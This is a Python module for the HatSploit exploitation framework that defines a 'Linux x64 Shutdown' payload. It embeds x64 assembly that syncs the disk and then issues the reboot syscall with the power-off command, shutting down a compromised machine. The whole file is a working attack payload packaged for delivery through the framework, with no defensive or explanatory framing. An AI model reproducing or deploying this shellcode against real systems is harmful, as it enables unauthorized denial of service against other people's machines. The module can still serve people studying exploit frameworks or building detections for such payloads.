"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Shutdown",
            'Payload': "linux/x64/shutdown",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shutdown payload for Linux x64.",
            'Architecture': "x64",
            'Platform': "linux",
            'Rank': "low",
            'Type': "one_side",
            'Actions': ['drop']
        }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                mov al, 0xa2
                syscall

                mov al, 0xa9
                mov edx, 0x4321fedc
                mov esi, 0x28121969
                mov edi, 0xfee1dead
                syscall
            """,
        )
